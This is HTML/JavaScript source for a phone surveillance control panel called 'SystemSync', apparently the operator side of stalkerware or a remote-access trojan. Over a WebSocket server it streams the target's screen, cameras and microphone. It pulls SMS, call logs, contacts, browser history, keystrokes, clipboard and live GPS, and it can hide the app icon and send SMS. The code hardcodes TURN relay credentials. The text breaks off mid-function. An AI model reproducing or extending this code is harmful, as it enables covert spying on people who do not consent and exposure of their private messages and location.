<!DOCTYPE html>
<html>
<head>
    <title>SystemSync Console</title>
    <link rel="stylesheet" href="https://unpkg.com/leaflet@1.9.4/dist/leaflet.css"/>
    <style>
        /* ---------- your existing styles (unchanged) ---------- */
        body{
            margin:0;
            background:#f5f7fa;
            font-family: 'Segoe UI', system-ui, sans-serif;
            display:flex;
            height:100vh;
            overflow:hidden;
        }
        #sidebar{
            width:280px;
            background:white;
            border-right:1px solid #e0e4e8;
            padding:20px;
            overflow-y:auto;
            box-shadow:2px 0 5px rgba(0,0,0,0.02);
        }
        .logo{
            font-size:20px;
            font-weight:600;
            color:#1976ff;
            margin-bottom:30px;
        }
        .section{
            margin-bottom:25px;
        }
        .section-title{
            font-size:12px;
            font-weight:600;
            color:#7b8a9b;
            text-transform:uppercase;
            letter-spacing:0.5px;
            margin-bottom:12px;
        }
        button{
            width:100%;
            padding:10px 12px;
            margin:4px 0;
            background:white;
            color:#1a2634;
            border:1px solid #d0d9e2;
            border-radius:8px;
            font-size:14px;
            text-align:left;
            cursor:pointer;
            transition:0.2s;
            display:flex;
            align-items:center;
            gap:8px;
        }
        button:hover{
            background:#1976ff;
            color:white;
            border-color:#1976ff;
        }
        .camera-panel {
            background: #f0f2f5;
            border-radius: 8px;
            padding: 12px;
            margin: 8px 0;
            display: none;
        }
        .camera-panel.show {
            display: block;
        }
        .camera-option {
            margin: 8px 0;
        }
        .camera-option label {
            margin-right: 15px;
            color: #1a2634;
        }
        .capture-btn, .live-btn {
            background: #1976ff;
            color: white;
            border: none;
            padding: 8px 12px;
            border-radius: 6px;
            cursor: pointer;
            width: 100%;
            margin-top: 8px;
        }
        .capture-btn:hover, .live-btn:hover {
            background: #0d5bca;
        }
        .live-controls {
            display: flex;
            gap: 8px;
            margin-top: 10px;
            flex-wrap: wrap;
        }
        .live-controls button {
            flex: 1;
            background: #1976ff;
            color: white;
            border: none;
            padding: 8px 3px;
            border-radius: 6px;
            cursor: pointer;
            width: auto;
        }
        .live-controls button.stop {
            background: #d32f2f;
        }
        .live-controls button.stop:hover {
            background: #b71c1c;
        }
        .live-controls button:disabled {
            opacity: 0.5;
            cursor: not-allowed;
        }
        #main{
            flex:1;
            display:flex;
            flex-direction:column;
            min-width:0;
            background:#f5f7fa;
        }
        #header{
            height:60px;
            background:white;
            border-bottom:1px solid #e0e4e8;
            display:flex;
            align-items:center;
            justify-content:space-between;
            padding:0 25px;
            font-weight:600;
            color:#1a2634;
        }
        #status{
            padding:6px 16px;
            border-radius:30px;
            background:#e8f0fe;
            color:#1976ff;
            font-weight:500;
            cursor: pointer;
        }
        #status.offline{
            background:#ffebee;
            color:#c62828;
        }
        #content{
            flex:1;
            padding:20px;
            overflow:auto;
        }
        #main-panel{
            background:white;
            border-radius:12px;
            box-shadow:0 2px 8px rgba(0,0,0,0.05);
            padding:20px;
            min-height:100%;
            position:relative;
        }
        #map{
            height:400px;
            border-radius:10px;
        }
        .map-info {
            position: absolute;
            top: 30px;
            left: 30px;
            background: rgba(255,255,255,0.95);
            padding: 8px 12px;
            border-radius: 8px;
            box-shadow: 0 2px 6px rgba(0,0,0,0.2);
            font-size: 13px;
            color: #1a2634;
            z-index: 1000;
            pointer-events: none;
            border-left: 4px solid #1976ff;
        }
        .map-info div {
            margin: 2px 0;
        }
        .map-info .coord {
            font-weight: 600;
        }
        .map-info .addr {
            color: #2c3e50;
            font-style: italic;
        }
        table{
            width:100%;
            border-collapse:collapse;
            font-size:14px;
        }
        th{
            background:#f8fafd;
            color:#1a2634;
            font-weight:600;
            padding:12px 10px;
            text-align:left;
            border-bottom:2px solid #e0e4e8;
        }
        td{
            padding:10px;
            border-bottom:1px solid #eef2f5;
            color:#2c3e50;
            word-break:break-word;
        }
        tr:hover{
            background:#f5f9ff;
        }
        .file-manager {
            display: flex;
            flex-direction: column;
            height: 100%;
        }
        .file-toolbar-sticky {
            position: sticky;
            top: 0;
            background: white;
            z-index: 10;
            padding-bottom: 10px;
            margin-bottom: 10px;
            border-bottom: 1px solid #eef2f5;
        }
        .file-toolbar {
            display: flex;
            align-items: center;
            gap: 8px;
            flex-wrap: wrap;
        }
        .file-toolbar button{
            width:auto;
            padding:6px 12px;
            background:white;
            border:1px solid #d0d9e2;
            border-radius:6px;
            cursor:pointer;
            font-size:13px;
            margin:0;
        }
        .file-toolbar button:hover{
            background:#1976ff;
            color:white;
        }
        .file-path{
            background:#f0f2f5;
            padding:6px 12px;
            border-radius:20px;
            font-size:13px;
            color:#2c3e50;
            flex:1;
        }
        .file-panes {
            display: flex;
            gap: 20px;
            flex: 1;
            overflow: hidden;
            min-height: 300px;
        }
        .folder-pane {
            flex: 1;
            background: #fafbfc;
            border-radius: 8px;
            padding: 10px;
            overflow-y: auto;
            border: 1px solid #eef2f5;
        }
        .file-pane {
            flex: 1;
            background: #fafbfc;
            border-radius: 8px;
            padding: 10px;
            overflow-y: auto;
            border: 1px solid #eef2f5;
        }
        .pane-title {
            font-size: 12px;
            font-weight: 600;
            color: #7b8a9b;
            margin-bottom: 10px;
            text-transform: uppercase;
        }
        .folder-item, .file-item {
            display: flex;
            align-items: center;
            padding: 6px 8px;
            border-radius: 6px;
            cursor: pointer;
            gap: 8px;
            margin-bottom: 2px;
        }
        .folder-item:hover {
            background: #e3f2fd;
        }
        .file-item {
            cursor: default;
        }
        .file-item:hover {
            background: #f5f5f5;
        }
        .folder-icon, .file-icon {
            width: 20px;
            text-align: center;
        }
        .folder-name, .file-name {
            flex: 1;
            font-size: 14px;
        }
        .folder-name {
            color: #1976ff;
        }
        .file-checkbox {
            width: 18px;
            height: 18px;
            cursor: pointer;
            margin-right: 8px;
        }
        .file-size {
            color: #7b8a9b;
            font-size: 12px;
            margin-left: 10px;
        }
        .download-selected{
            margin-top:15px;
            text-align:right;
            position: sticky;
            bottom: 0;
            background: white;
            padding: 10px 0 0 0;
            border-top: 1px solid #eef2f5;
        }
        .download-selected button{
            width:auto;
            padding:8px 16px;
            background:#1976ff;
            color:white;
            border:none;
            border-radius:6px;
            cursor:pointer;
            font-weight:500;
        }
        .download-selected button:hover{
            background:#0d5bca;
        }
        .pagination{
            margin-top:20px;
            display:flex;
            gap:8px;
            justify-content:center;
        }
        .page-btn{
            padding:6px 12px;
            border:1px solid #d0d9e2;
            background:white;
            border-radius:6px;
            cursor:pointer;
            color:#1a2634;
        }
        .page-btn:hover{
            background:#1976ff;
            color:white;
            border-color:#1976ff;
        }
        img, video {
    max-width: 100%;
    max-height: 70vh;
    border-radius: 8px;
    display: block;
    margin: 0 auto;
}
        audio{
            width:100%;
            margin-top:15px;
        }
        .reconnect-btn{
            background: #1976ff;
            color: white;
            border: none;
            border-radius: 20px;
            padding: 5px 15px;
            font-size: 12px;
            cursor: pointer;
            margin-left: 10px;
        }


/* ── Screen-share modal: strict 9:16 portrait viewport-relative ──────── */

/* .screen-container: remove aspect-ratio — phone-frame fills everything */
.screen-container {
    width: 100%;
    height: 100%;          /* fill the flex:1 phone-frame completely */
    background: black;
    display: flex;
    justify-content: center;
    align-items: center;
}

/* Video: cover the full phone-frame, no black bars */
.screen-container video {
    width: 100%;
    height: 100%;
    object-fit: cover;     /* fill frame, crop edges if needed — no black bars */
    display: block;
}

/* ---------- MODAL OVERLAY ---------- */
.modal-overlay {
    position: fixed;
    inset: 0;
    background: rgba(0, 0, 0, 0.92);
    display: none;
    justify-content: center;
    align-items: center;
    z-index: 10000;
}
.modal-overlay.show {
    display: flex;
}

/* ---------- MOBILE POPUP: 9:16 portrait, viewport-relative ---------- */
.mobile-popup {
    /* Width is constrained so height never exceeds 92vh at 9:16 ratio */
    width: min(92vw, calc(92vh * 9 / 16));
    height: min(92vh, calc(92vw * 16 / 9));
    display: flex;
    flex-direction: column;
    background: #0f0f0f;
    border-radius: 20px;
    border: 4px solid #2e2e2e;
    box-shadow: 0 32px 100px rgba(0, 0, 0, 0.95);
    overflow: hidden;
}

/* Phone frame takes ALL remaining height above the fixed control bar */
.phone-frame {
    flex: 1;               /* grows to fill all space above controls */
    min-height: 0;         /* critical: allows flex child to shrink below content size */
    display: flex;
    background: black;
    overflow: hidden;
}

/* Video fills the full phone-frame — no wrappers constraining it */
.phone-frame video {
    width: 100%;
    height: 100%;
    object-fit: cover;     /* fills frame completely — no black bars */
    display: block;
}

/* ---------- CONTROL BAR: FIXED SIZE, NEVER STRETCHES ---------- */
.popup-controls {
    flex-shrink: 0;        /* never shrinks */
    background: #111;
    padding: 10px 12px;
    display: flex;
    gap: 8px;
    justify-content: center;
    align-items: center;
    /* Fixed height regardless of popup width or screen resolution */
    height: 52px;
    box-sizing: border-box;
}

/* Buttons: FIXED size in px — completely resolution-independent */
.popup-controls button {
    flex: 0 0 auto;        /* NO grow, NO shrink — absolute fixed size */
    width: 44px;
    height: 32px;
    background: #1e1e1e;
    color: white;
    border: none;
    border-radius: 8px;
    cursor: pointer;
    font-size: 18px;       /* emoji size */
    line-height: 1;
    display: flex;
    align-items: center;
    justify-content: center;
    transition: background 0.15s, transform 0.1s;
}
.popup-controls button:hover {
    background: #3a3a3c;
    transform: scale(1.08);
}
.popup-controls button:active {
    transform: scale(0.93);
}

/* Close button slightly wider with red background */
.popup-controls button.close-btn {
    background: #c0392b;
    width: 52px;
}
.popup-controls button.close-btn:hover {
    background: #e74c3c;
}

/* Fullscreen button */
.popup-controls button.fullscreen-btn {
    background: #3a3a3c;
}
.popup-controls button.fullscreen-btn:hover {
    background: #505052;
}

        /* blur background when modal is open */
        body.modal-open #sidebar,
        body.modal-open #main {
            pointer-events: none;
            filter: blur(4px);
            transition: filter 0.3s;
        }
    </style>
</head>
<body>

<!-- MODAL OVERLAY (for screen share) -->
<div id="screenModalOverlay" class="modal-overlay">
    <div class="mobile-popup">
        <div class="phone-frame">
            <div class="screen-container">
            <video id="modalScreenVideo" autoplay playsinline></video>
            </div>
        </div>
        <div class="popup-controls">
            <button id="modalSnapBtn" title="Snapshot">📸</button>
            <button id="modalRecordBtn" title="Record">🔴</button>
            <button id="modalFullscreenBtn" class="fullscreen-btn" title="Fullscreen">⛶</button>
            <button id="modalCloseBtn" class="close-btn" title="Close">✕</button>
        </div>
    </div>
</div>

<div id="sidebar">
    <div class="logo">SystemSync</div>

    <div class="section">
        <div class="section-title">Surveillance</div>
        <button id="screenShareBtn"><span>🖥</span> <span id="screenBtn">Start Screen</span></button>

        <!-- Click Picture panel -->
        <button onclick="toggleCameraPanel('click')"><span>📷</span> Click Picture</button>
        <div id="clickCameraPanel" class="camera-panel">
            <div class="camera-option">
                <label><input type="radio" name="clickCameraSelect" value="front" checked> Front</label>
                <label><input type="radio" name="clickCameraSelect" value="back"> Rear</label>
            </div>
            <div class="camera-option">
                <label><input type="checkbox" id="clickFlashCheckbox"> Use flash</label>
            </div>
            <button class="capture-btn" onclick="capturePicture()">TAKE A PICTURE</button>
        </div>

        <!-- See Live panel -->
        <button onclick="toggleCameraPanel('live')"><span>📹</span> See Live</button>
        <div id="liveCameraPanel" class="camera-panel">
            <div class="camera-option">
                <label><input type="radio" name="liveCameraSelect" value="front" checked> FrontCAM</label>
                <label><input type="radio" name="liveCameraSelect" value="back"> BackCAM</label>
            </div>
            <div class="camera-option">
                <label><input type="checkbox" id="liveFlashCheckbox"> Use flash</label>
                <label><input type="checkbox" id="liveMicCheckbox" checked> Use mic</label>
            </div>
            <button class="live-btn" onclick="startLiveStream()">See Live</button>
        </div>

        <!-- Live Audio button -->
        <button onclick="toggleLiveAudio()"><span>🎤</span> <span id="liveAudioBtn">Live Audio</span></button>
        <button onclick="stopLiveAudio()" style="display:none;" id="stopLiveAudioBtn">⏹ Stop Live Audio</button>

        <button onclick="sendCommand('GET_LOCATION')"><span>📍</span> GPS Location</button>
    </div>

    <div class="section">
        <div class="section-title">Data</div>
        <button onclick="sendCommand('LIST_FILES', { path: 'root' })"><span>📂</span> File Manager</button>
        <button onclick="sendCommand('GET_SMS', { box: 'inbox' })"><span>💬</span> SMS Inbox</button>
        <button onclick="sendCommand('GET_SMS', { box: 'sent' })"><span>📤</span> SMS Sent</button>
        <button onclick="sendCommand('GET_CALL_LOGS')"><span>📞</span> Call Logs</button>
        <button onclick="sendCommand('GET_CONTACTS')"><span>👥</span> Contacts</button>
        <button onclick="sendCommand('GET_INSTALLED_APPS')"><span>📱</span> Installed Apps</button>
        <button onclick="sendCommand('GET_BROWSER_HISTORY')"><span>🌐</span> Browser History</button>
        <button onclick="sendCommand('GET_WIFI_NETWORKS')"><span>📶</span> Wi-Fi Networks</button>
    </div>

    <div class="section">
        <div class="section-title">Monitoring</div>
        <button onclick="showAppUsagePanel()"><span>📊</span> Screen Time</button>
        <button onclick="sendCommand('GET_NOTIFICATIONS')"><span>🔔</span> Social Messages</button>
        <button onclick="sendCommand('GET_KEYLOG')"><span>⌨️</span> Keyboard Log</button>
        <button onclick="sendCommand('GET_CLIPBOARD')"><span>📋</span> Clipboard</button>
        <button onclick="showGeofencePanel()"><span>🗺️</span> Geofence</button>
        <button onclick="showSchedulePanel()"><span>⏱️</span> Auto Capture</button>
        <button onclick="toggleLiveGps()" id="liveGpsBtn"><span>🛰️</span> Live GPS Track</button>
    </div>

    <div class="section">
        <div class="section-title">Control</div>
        <button onclick="toggleAppIcon()"><span>👻</span> <span id="iconBtn">Hide Icon</span></button>
        <button onclick="sendCommand('LOCK_DEVICE')"><span>🔒</span> Lock Screen</button>
        <button onclick="showSendSmsPanel()"><span>✉️</span> Send SMS</button>
        <button onclick="sendCommand('VIBRATE', { duration: 1000 })"><span>📳</span> Vibrate (1s)</button>
    </div>

    <div id="alertsBadge" style="margin:10px 0;display:none;">
        <div style="background:#fff3e0;border:1px solid #ff9800;border-radius:8px;padding:10px;font-size:12px;">
            <strong>⚠️ Alerts</strong>
            <div id="alertsList" style="margin-top:6px;max-height:150px;overflow:auto;"></div>
            <button onclick="clearAlerts()" style="margin-top:6px;font-size:11px;padding:3px 8px;background:#ff9800;color:#fff;border:none;border-radius:4px;cursor:pointer;">Clear</button>
        </div>
    </div>
</div>

<div id="main">
    <div id="header">
        <div>Control Panel</div>
        <div style="display: flex; align-items: center;">
            <span id="status">CONNECTING</span>
            <button class="reconnect-btn" onclick="connectWebSocket()">⟲ Reconnect</button>
        </div>
    </div>
    <div id="content">
        <div id="main-panel">
            Ready. Click any button to send command.
        </div>
    </div>
</div>

<!-- Leaflet -->
<link rel="stylesheet" href="https://unpkg.com/leaflet@1.9.4/dist/leaflet.css"/>
<script src="https://unpkg.com/leaflet@1.9.4/dist/leaflet.js"></script>
<script type="module">
    // ---------- GLOBALS ----------
    const WS_URL = "wss://mirror-view.onrender.com";
    let ws = null;

    // WebRTC peer connections
    let screenPC = null;
    let cameraPC = null;
    let audioPC = null;

    // UI state
    let mapInstance = null;
    let currentData = [];
    let currentPage = 0;
    let dataType = null;
    let currentPath = "root";
    let selectedFiles = [];
    let screenActive = false;
    let iconHidden = false;

    // Live camera recording state
    let mediaRecorder = null;
    let recordedChunks = [];

    // Track the last command sent to interpret raw responses
    let pendingCommand = null;

    const panel = document.getElementById('main-panel');
    const statusEl = document.getElementById('status');

    // Modal elements
    const modalOverlay = document.getElementById('screenModalOverlay');
    const modalVideo = document.getElementById('modalScreenVideo');
modalVideo.addEventListener("loadedmetadata", () => {

    const w = modalVideo.videoWidth;
    const h = modalVideo.videoHeight;

    const popup = document.querySelector(".mobile-popup");

    if (h > w) {
        // Portrait phone
        popup.style.aspectRatio = "9 / 16";
    } else {
        // Landscape screen
        popup.style.aspectRatio = "16 / 9";
    }

});
    
    const modalSnapBtn = document.getElementById('modalSnapBtn');
    const modalRecordBtn = document.getElementById('modalRecordBtn');
    const modalFullscreenBtn = document.getElementById('modalFullscreenBtn');
    const modalCloseBtn = document.getElementById('modalCloseBtn');
   
    function getFormattedDateTime() {
        const d = new Date();
        const pad = (n) => n.toString().padStart(2, '0');
        return `${pad(d.getDate())}-${pad(d.getMonth()+1)}-${d.getFullYear()}-${pad(d.getHours())}-${pad(d.getMinutes())}-${pad(d.getSeconds())}`;
    }
    // ---------- ICE SERVERS ----------
    const ICE_SERVERS = [
        { urls: "stun:stun.relay.metered.ca:80" },
        { urls: "turn:standard.relay.metered.ca:80", username: "dc05b4f4ae8aaae1fff19747", credential: "OrIiLL1BH86B17iP" },
        { urls: "turn:standard.relay.metered.ca:80?transport=tcp", username: "dc05b4f4ae8aaae1fff19747", credential: "OrIiLL1BH86B17iP" },
        { urls: "turn:standard.relay.metered.ca:443", username: "dc05b4f4ae8aaae1fff19747", credential: "OrIiLL1BH86B17iP" },
        { urls: "turns:standard.relay.metered.ca:443?transport=tcp", username: "dc05b4f4ae8aaae1fff19747", credential: "OrIiLL1BH86B17iP" }
    ];

    // ---------- SIGNALING OVER WEBSOCKET ----------
    function sendSignalingMessage(msg) {
        if (!ws || ws.readyState !== WebSocket.OPEN) {
            console.error('WebSocket not open');
            return;
        }
        const payload = {
            type: 'SIGNALING',
            data: msg
        };
        ws.send(JSON.stringify(payload));
        console.log('📤 Signaling sent:', msg.type);
    }

    // ---------- PEER CONNECTION CREATORS ----------
    function createPeerConnection(streamType, onTrackCallback, useMic = false) {
        const pc = new RTCPeerConnection({ iceServers: ICE_SERVERS });

        // Add transceivers to receive media
        if (streamType === 'screen') {
            pc.addTransceiver('video', { direction: 'recvonly' });
        } else if (streamType === 'camera') {
            pc.addTransceiver('video', { direction: 'recvonly' });
            if (useMic) {
                pc.addTransceiver('audio', { direction: 'recvonly' });
            }
        } else if (streamType === 'audio') {
            pc.addTransceiver('audio', { direction: 'recvonly' });
        }

        pc.ontrack = onTrackCallback;
        pc.onicecandidate = (e) => {
            if (e.candidate) {
                sendSignalingMessage({
                    type: 'ICE_CANDIDATE',
                    candidate: e.candidate,
                    streamType: streamType
                });
            }
        };
        pc.oniceconnectionstatechange = () => {
            console.log(`${streamType} ICE state:`, pc.iceConnectionState);
            if (pc.iceConnectionState === 'disconnected' || pc.iceConnectionState === 'failed') {
                if (streamType === 'screen') {
                    screenActive = false;
                    document.getElementById('screenBtn').innerText = 'Start Screen';
                    // Also close modal if it's open
                    closeScreenModal();
                }
            }
        };
        pc.onconnectionstatechange = () => {
            console.log(`${streamType} connection state:`, pc.connectionState);
        };
        return pc;
    }

    // Helper to get the correct peer connection based on stream type
    function getPCForType(type) {
        if (type === 'screen') return screenPC;
        if (type === 'camera') return cameraPC;
        if (type === 'audio') return audioPC;
        return null;
    }

    // ---------- HANDLE INCOMING SIGNALING MESSAGES ----------
    function handleSignalingMessage(msg) {
        console.log('Received signaling:', msg);
        if (msg.type === 'ANSWER') {
            const pc = getPCForType(msg.streamType);
            if (pc) {
                const answer = new RTCSessionDescription({ type: 'answer', sdp: msg.sdp });
                pc.setRemoteDescription(answer).catch(e => console.error('Error setting remote description:', e));
            }
        } else if (msg.type === 'ICE_CANDIDATE') {
            const pc = getPCForType(msg.streamType);
            if (pc && msg.candidate) {
                pc.addIceCandidate(new RTCIceCandidate(msg.candidate)).catch(e => console.error('Error adding ICE candidate:', e));
                console.log('ICE candidate added for', msg.streamType);
            }
        }
    }

    // ---------- MODAL CONTROL ----------
   function openScreenModal() {
    modalOverlay.classList.add('show');
    document.body.classList.add('modal-open');
    // Reset recording button to red dot
    modalRecordBtn.innerText = '🔴';          // red dot = start recording
    if (screenMediaRecorder && screenMediaRecorder.state === 'recording') {
        screenMediaRecorder.stop();
    }
    screenMediaRecorder = null;
    screenRecordedChunks = [];
}

    function closeScreenModal() {
    if (screenMediaRecorder && screenMediaRecorder.state === 'recording') {
        screenMediaRecorder.stop();
    }
    modalOverlay.classList.remove('show');
    document.body.classList.remove('modal-open');
    if (screenActive) {
        toggleScreen();
    }
    // Reset record button (in case it was left in green state)
    modalRecordBtn.innerText = '🔴';
}

    // ---------- SCREEN SHARE (modified for modal) ----------
    async function toggleScreen() {
        console.log('toggleScreen called, current screenActive:', screenActive);
        if (screenActive) {
            // Stop screen share
            if (screenPC) {
                screenPC.close();
                screenPC = null;
            }
            document.getElementById('screenBtn').innerText = 'Start Screen';
            screenActive = false;
            closeScreenModal(); // close the modal
            sendSignalingMessage({ type: 'STOP_SCREEN' });
        } else {
            // Start screen share - open modal first (video will appear when track arrives)
            openScreenModal();
            // Clear any previous video source
            modalVideo.srcObject = null;

            screenPC = createPeerConnection('screen', (e) => {
                // When track arrives, attach to modal video
                modalVideo.srcObject = e.streams[0];
                console.log('ontrack for screen', e.streams);
            }, false);

            try {
                const offer = await screenPC.createOffer();
                await screenPC.setLocalDescription(offer);
                sendSignalingMessage({
                    type: 'OFFER',
                    sdp: offer.sdp,
                    streamType: 'screen'
                });
                document.getElementById('screenBtn').innerText = 'Stop Screen';
                screenActive = true;
            } catch (e) {
                console.error('Screen share failed:', e);
                showNotification('Failed: ' + e.message);
                screenPC = null;
                closeScreenModal();
            }
        }
    }

    // ---------- SNAP SCREEN (from modal) ----------
    function snapScreenFromModal() {
        if (!modalVideo || !modalVideo.videoWidth) {
            alert('No active screen share or video not ready');
            return;
        }
        const canvas = document.createElement('canvas');
        canvas.width = modalVideo.videoWidth;
        canvas.height = modalVideo.videoHeight;
        canvas.getContext('2d').drawImage(modalVideo, 0, 0);
        canvas.toBlob(blob => {
            const url = URL.createObjectURL(blob);
            const a = document.createElement('a');
            a.download = `screenImage-${getFormattedDateTime()}.png`;
            a.href = url;
            a.click();
            URL.revokeObjectURL(url);
        }, 'image/png');
    }

    // ---------- RECORD SCREEN (from modal) ----------
    let screenMediaRecorder = null;
    let screenRecordedChunks = [];

    function toggleScreenRecording() {
    if (screenMediaRecorder && screenMediaRecorder.state === 'recording') {
        screenMediaRecorder.stop();
        modalRecordBtn.innerText = '🔴';      // back to red dot
    } else {
        if (!modalVideo.srcObject) {
            alert('Phone Screen Off');
            return;
        }
        screenRecordedChunks = [];
        const canvas = document.createElement('canvas');
        const ctx = canvas.getContext('2d');
        const stream = modalVideo.srcObject;

        if (modalVideo.videoWidth === 0) {
            modalVideo.onloadedmetadata = () => startScreenRecording(canvas, ctx, stream);
        } else {
            startScreenRecording(canvas, ctx, stream);
        }
    }
}

    function startScreenRecording(canvas, ctx, originalStream) {
    canvas.width = modalVideo.videoWidth;
    canvas.height = modalVideo.videoHeight;

    function drawVideoFrame() {
        ctx.drawImage(modalVideo, 0, 0, canvas.width, canvas.height);
        requestAnimationFrame(drawVideoFrame);
    }
    drawVideoFrame();

    const canvasStream = canvas.captureStream(30);
    originalStream.getAudioTracks().forEach(track => canvasStream.addTrack(track));

    screenMediaRecorder = new MediaRecorder(canvasStream, { mimeType: 'video/webm' });
    screenMediaRecorder.ondataavailable = (e) => screenRecordedChunks.push(e.data);
    screenMediaRecorder.onstop = () => {
        const blob = new Blob(screenRecordedChunks, { type: 'video/webm' });
        const url = URL.createObjectURL(blob);
        const a = document.createElement('a');
        a.href = url;
        a.download = `screenVideo-${getFormattedDateTime()}.webm`;
        a.click();
        URL.revokeObjectURL(url);
        canvasStream.getTracks().forEach(track => track.stop());
    };
    screenMediaRecorder.start();
    modalRecordBtn.innerText = '🟢';          // green dot = stop recording
}
    // Fullscreen toggle
    function toggleFullscreen() {
        if (!document.fullscreenElement) {
            modalVideo.requestFullscreen().catch(err => console.error('Fullscreen error:', err));
        } else {
            document.exitFullscreen();
        }
    }

    // Attach modal button listeners
    modalSnapBtn.addEventListener('click', snapScreenFromModal);
    modalRecordBtn.addEventListener('click', toggleScreenRecording);
    modalFullscreenBtn.addEventListener('click', toggleFullscreen);
    modalCloseBtn.addEventListener('click', closeScreenModal);

    // ---------- LIVE CAMERA ----------
    async function startLiveStream() {
        const camera = document.querySelector('input[name="liveCameraSelect"]:checked').value;
        const useFlash = document.getElementById('liveFlashCheckbox').checked;
        const useMic = document.getElementById('liveMicCheckbox').checked;

        panel.innerHTML = `
            <video id="liveCamVideo" autoplay playsinline></video>
            <div class="live-controls">
                <button onclick="takeSnapshot()" id="snapshotBtn">Take Snapshot</button>
                <button onclick="toggleRecording()" id="recordBtn">Record Video</button>
                <button class="stop" onclick="stopLiveStream()">Stop</button>
            </div>
        `;

        cameraPC = createPeerConnection('camera', (e) => {
            const video = document.getElementById('liveCamVideo');
            if (video) video.srcObject = e.streams[0];
            console.log('ontrack for camera', e.streams);
        }, useMic);

        try {
            const offer = await cameraPC.createOffer();
            await cameraPC.setLocalDescription(offer);
            sendSignalingMessage({
                type: 'OFFER',
                sdp: offer.sdp,
                streamType: 'camera',
                camera: camera,
                flash: useFlash,
                mic: useMic
            });
        } catch (e) {
            console.error('Live camera start failed:', e);
            showNotification('Failed to start camera stream');
            cameraPC = null;
            panel.innerHTML = 'Ready.';
        }
    }

    function stopLiveStream() {
        if (cameraPC) {
            cameraPC.close();
            cameraPC = null;
        }
        sendSignalingMessage({ type: 'STOP_CAMERA' });
        panel.innerHTML = 'Ready.';
    }

    // ---------- LIVE AUDIO ----------
    async function toggleLiveAudio() {
        if (audioPC) {
            stopLiveAudio();
        } else {
            startLiveAudio();
        }
    }

    async function startLiveAudio() {
        panel.innerHTML = '<div style="text-align:center;">Live audio streaming...<br><audio id="liveAudio" autoplay controls style="width:100%; margin-top:10px;"></audio></div>';
        audioPC = createPeerConnection('audio', (e) => {
            const audioEl = document.getElementById('liveAudio');
            if (audioEl) {
                audioEl.srcObject = e.streams[0];
                audioEl.play().catch(err => console.log('Autoplay prevented:', err));
            }
            console.log('ontrack for audio', e.streams);
        }, true);

        try {
            const offer = await audioPC.createOffer();
            await audioPC.setLocalDescription(offer);
            sendSignalingMessage({
                type: 'OFFER',
                sdp: offer.sdp,
                streamType: 'audio',
                mic: true
            });
            document.getElementById('liveAudioBtn').parentElement.style.display = 'none';
            document.getElementById('stopLiveAudioBtn').style.display = 'block';
        } catch (e) {
            console.error('Live audio start failed:', e);
            showNotification('Failed to start audio stream');
            audioPC = null;
            panel.innerHTML = 'Ready.';
        }
    }

    function stopLiveAudio() {
        if (audioPC) {
            audioPC.close();
            audioPC = null;
        }
        sendSignalingMessage({ type: 'STOP_AUDIO' });
        document.getElementById('liveAudioBtn').parentElement.style.display = 'block';
        document.getElementById('stopLiveAudioBtn').style.display = 'none';
        panel.innerHTML = 'Ready.';
    }

    // ---------- COMMAND SENDING (JSON) ----------
    function sendCommand(command, params = {}) {
        if (!ws || ws.readyState !== WebSocket.OPEN) {
            panel.innerHTML = `<div style="color:#d32f2f;">⚠ WebSocket not connected. Click reconnect.</div>`;
            return;
        }
        const requestId = 'req_' + Date.now() + '_' + Math.random().toString(36).substr(2, 5);
        const payload = {
            type: 'COMMAND',
            command: command,
            requestId: requestId,
            params: params,
            timestamp: Date.now()
        };
        ws.send(JSON.stringify(payload));
        panel.innerHTML = `📤 Command sent: ${command}`;
        pendingCommand = command;
        if (command === 'LIST_FILES') currentPath = params.path || 'root';
        setTimeout(() => { if (pendingCommand === command) pendingCommand = null; }, 10000);
    }

    // ---------- PLAIN TEXT SENDING (for hideApp/showApp and file downloads) ----------
    function sendPlainText(msg) {
        if (!ws || ws.readyState !== WebSocket.OPEN) {
            panel.innerHTML = `<div style="color:#d32f2f;">⚠ WebSocket not connected. Click reconnect.</div>`;
            return;
        }
        ws.send(msg);
        panel.innerHTML = `📤 Plain text sent: ${msg}`;
    }

    // ---------- PLAIN TEXT / JSON HANDLERS ----------
    function handleJSON(json) {
        console.log('handleJSON:', json.type, json);
        switch (json.type) {
            case 'SMS_DATA':
                console.log('📩 SMS_DATA received', json.data);
                dataType = 'sms';
                currentData = json.data;
                renderTable();
                pendingCommand = null;
                break;
            case 'CALL_LOGS':
                dataType = 'call';
                currentData = json.data;
                renderTable();
                pendingCommand = null;
                break;
            case 'FILE_LIST':
                dataType = 'file';
                currentData = json.data;
                renderFiles();
                pendingCommand = null;
                break;
            case 'LOCATION_UPDATE':
                renderMap(json.data);
                pendingCommand = null;
                break;
            case 'CAMERA_IMAGE':
                displayCapturedImage(json.data);
                pendingCommand = null;
                break;
            case 'AUDIO_RECORDING':
                showAudio(json.data);
                pendingCommand = null;
                break;
            case 'ERROR':
                panel.innerHTML = `<div style="color:#d32f2f;">Error: ${json.error}</div>`;
                pendingCommand = null;
                break;
            case 'DEVICE_STATUS':
                setStatus(json.status);
                pendingCommand = null;
                break;
            case 'APP_HIDDEN':
                iconHidden = true;
                document.getElementById('iconBtn').innerText = 'Show Icon';
                showNotification('App icon hidden');
                pendingCommand = null;
                break;
            case 'APP_SHOWN':
                iconHidden = false;
                document.getElementById('iconBtn').innerText = 'Hide Icon';
                showNotification('App icon shown');
                pendingCommand = null;
                break;
            case 'SCREEN_SHARE_STARTED':
                screenActive = true;
                document.getElementById('screenBtn').innerText = 'Stop Screen';
                showNotification('Screen share started');
                pendingCommand = null;
                break;
            case 'SCREEN_SHARE_STOPPED':
                screenActive = false;
                document.getElementById('screenBtn').innerText = 'Start Screen';
                if (screenPC) { screenPC.close(); screenPC = null; }
                showNotification('Screen share stopped');
                pendingCommand = null;
                break;
            // ── New parental monitoring responses ──────────────────────
            case 'CONTACTS_DATA':
                displayContacts(parseData(json.data));
                pendingCommand = null;
                break;
            case 'INSTALLED_APPS':
                displayInstalledApps(parseData(json.data));
                pendingCommand = null;
                break;
            case 'APP_USAGE_DATA':
                displayAppUsage(parseData(json.data));
                pendingCommand = null;
                break;
            case 'NOTIFICATIONS_DATA':
                displayNotifications(parseData(json.data));
                pendingCommand = null;
                break;
            case 'NOTIFICATIONS_CLEARED':
                showNotification('Notifications cleared');
                break;
            case 'BROWSER_HISTORY_DATA':
                displayBrowserHistory(parseData(json.data));
                pendingCommand = null;
                break;
            case 'KEYLOG_DATA':
                displayKeylog(parseData(json.data));
                pendingCommand = null;
                break;
            case 'KEYLOG_CLEARED':
                showNotification('Keylog cleared');
                break;
